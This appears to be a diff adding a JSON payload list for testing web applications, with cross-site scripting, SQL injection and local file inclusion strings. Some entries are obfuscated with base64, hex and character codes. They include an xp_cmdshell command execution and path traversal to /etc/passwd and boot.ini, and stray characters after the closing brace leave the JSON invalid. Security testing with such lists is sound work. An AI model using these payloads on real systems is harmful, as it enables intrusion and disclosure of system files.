@@ -1,0 +1,17 @@
+{
+  "xss": [
+    "eval(atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))",
+    "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e",
+    "<svg onload=alert('XSS')>"
+  ],
+  "sqli": [
+    "eval(String.fromCharCode(39,32,79,82,32,39,49,39,61,39,49))",
+    "' OR '1'='1' --",
+    "'; EXEC xp_cmdshell('dir'); --"
+  ],
+  "lfi": [
+    "eval(String.fromCharCode(46,46,47,101,116,99,47,112,97,115,115,119,100))",
+    "../../../etc/passwd",
+    "../../../../boot.ini"
+  ]
+}[]
